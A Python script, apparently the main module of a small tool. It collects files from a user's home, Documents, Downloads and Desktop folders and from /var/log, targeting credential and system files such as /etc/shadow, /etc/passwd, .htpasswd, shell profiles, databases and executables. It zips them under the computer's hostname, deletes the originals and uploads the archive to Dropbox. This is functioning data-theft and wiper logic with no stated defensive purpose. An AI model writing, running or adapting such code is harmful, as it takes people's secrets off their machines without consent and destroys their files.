import logging
import platform
import socket

from pathlib import Path

from dropbox_uploader import DropboxUploader
from file_scanner import FileScanner
from file_compressor import FileCompressor
from file_cleaner import FileCleaner


def main():
    # Configure logging
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    # Define directories to scan and file extensions
    print(f"Platform: {platform.system()}")
    if platform.system() == "Windows":
        target_dirs = [
            str(Path.home() / "Documents"),
            str(Path.home() / "Downloads"),
            str(Path.home() / "Desktop")
        ]
    elif platform.system() == "Darwin":  # macOS
        target_dirs = [
            str(Path.home() / "Documents"),
            str(Path.home() / "Downloads"),
            str(Path.home() / "Desktop")
        ]
    else:  # Linux or other Unix-like systems
        target_dirs = [
            str(Path.home()),  # Home directory
            str(Path.home() / "Documents"),
            str(Path.home() / "Downloads"),
            str(Path.home() / "Desktop"),
            "/var/log"
        ]

    extensions = [
        '.sys', '.dll', '.exe', '.bat', '.sh', '.ini', '.cfg',
        '.log', '.dat', '.json', '.xml', '.yaml', '.db', '.sqlite',
        '.tmp', '.swp', '.bak', '.old', '.lnk',
        '.htaccess', '.htpasswd', 'Thumbs.db', 'desktop.ini',
        '/etc/passwd', '/etc/shadow', '.bashrc', '.zshrc', '.profile', '/var/log/',
        '.dll', '.so', '/var/cache/', '%temp%'
    ]

    # Get the computer name
    computer_name = socket.gethostname()

    # Initialize FileScanner
    scanner = FileScanner(extensions=extensions)

    # Scan directories
    logging.info("*** Starting Scan ***")
    files = scanner.scan_directories(target_dirs)

    if files:
        # Initialize FileCompressor with the computer name as the zip file name
        compressor = FileCompressor(zip_name=computer_name)

        # Compress the files
        logging.info("*** Starting Compression ***")
        zip_path = compressor.zip_files(files)
        logging.info(f"Compressed files to {zip_path}")

        # Initialize FileCleaner
        cleaner = FileCleaner()

        # Delete the files
        logging.info("*** Starting Deletion ***")
        cleaner.delete_files(files)

        logging.info("*** Uploading Zip File to Dropbox ***")

        dropbox_uploader = DropboxUploader(access_token="")
        dropbox_uploader.upload_file(str(zip_path), dropbox_folder="/ZippedFiles")

    logging.info("*** Operation Complete ***")


if __name__ == "__main__":
    main()
